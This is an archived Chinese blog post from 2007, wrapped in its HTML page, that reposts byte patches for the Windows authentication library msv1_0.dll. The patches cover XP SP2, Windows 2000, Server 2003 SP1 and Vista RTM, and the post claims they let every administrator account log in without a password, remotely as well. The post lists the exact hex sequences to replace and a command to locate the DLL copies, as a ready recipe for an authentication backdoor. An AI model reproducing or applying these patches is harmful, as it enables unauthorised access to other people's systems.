@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>清空系统密码 – est の 输入 输出和出入</title>
+<link rel="icon" href="https://est.im/favicon.svg">
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self' https://disqus.com https://player.bilibili.com https://www.youtube.com;">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="est の 输入 输出和出入 RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="清空系统密码" />
+
+    <link rel="canonical" href="https://blog.est.im/archives/341926" />
+    <meta property="og:url" content="https://blog.est.im/archives/341926">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="清空系统密码">
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    est の 输入 输出和出入
+  </a></h1>
+  <div class="hamburger-menu">
+    <button>
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://feeds.feedburner.com/initiative" class="hamburger-menu-overlay-link">RSS</a></li>
+      <li><a href="/about" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="/category" class="hamburger-menu-overlay-link">Category</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">清空系统密码</h2>
+    <p class="post-date">Posted <time datetime="2007-08-24T00:00:00+08:00">2007-08-24</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>转自<a href="http://www.1v1.name/show-248-1.html">7jdg</a>, <a href="http://blog.csdn.net/freexploit/archive/2007/08/24/1756845.aspx">Freexploit</a></p>
+<p>这东西再放都长毛了,放出来....精灵还写了个利用工具,找不到了.回头补上..</p>
+<p>System32下 有个msv1_0.dll</p>
+<p>xp sp2<br />
+F8 10 75 11 B0 01 8B 4D<br />
+修改为<br />
+E0 00 75 11 B0 01 8B 4D</p>
+<p>2k professinal<br />
+F8 10 0F 84 71 FF FF<br />
+修改为<br />
+E0 00 0F 84 71 FF FF</p>
+<p>2k sp4<br />
+F8 10 75 11 b0 01 8b 4D<br />
+修改为<br />
+E0 00 75 11 b0 01 8b 4D</p>
+<p>2003 sp1<br />
+F8 10 0F 84 D0 B8 FF FF<br />
+修改为<br />
+E0 00 0F 84 D0 B8 FF FF</p>
+<p>vista rtm<br />
+F8 10 75 13 B0 01 8B 4D<br />
+修改为<br />
+E0 00 75 13 B0 01 8B 4D</p>
+<p>都是前两个字节改为<br />
+E0 00</p>
+<p>全部管理员帐号无须密码登陆<br />
+包括远程登陆的</p>
+<p>改两个目录的 msv1_0.dll 用16进制</p>
+<p>dir /s c:\windows\msv1_0.dll</p>
+</article>
+
+<div class="comments">
+  <h2>Comments</h2>
+  <script type="text/javascript" defer src="https://c.est.im/req4cmt.js"></script>
+</div>    </main>
+
+
+  </body>
+
+</html>
